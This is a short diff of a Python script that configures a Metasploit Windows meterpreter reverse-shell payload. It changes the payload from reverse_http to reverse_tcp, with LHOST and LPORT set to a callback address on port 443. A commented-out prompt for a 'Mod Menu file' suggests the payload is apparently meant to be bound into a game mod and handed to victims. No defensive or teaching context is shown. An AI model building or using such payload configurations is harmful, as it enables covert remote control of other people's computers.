@@ -11,7 +11,7 @@ import sys
 import StringIO
 sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen
 
-payload_Generate = 'windows/meterpreter/reverse_http'
+payload_Generate = 'windows/meterpreter/reverse_tcp'
 LHOST = '8.8.8.8'
 LPORT = '443'
 # input_Mod_Menu = str(raw_input("Enter the full path of the Mod Menu file: "))
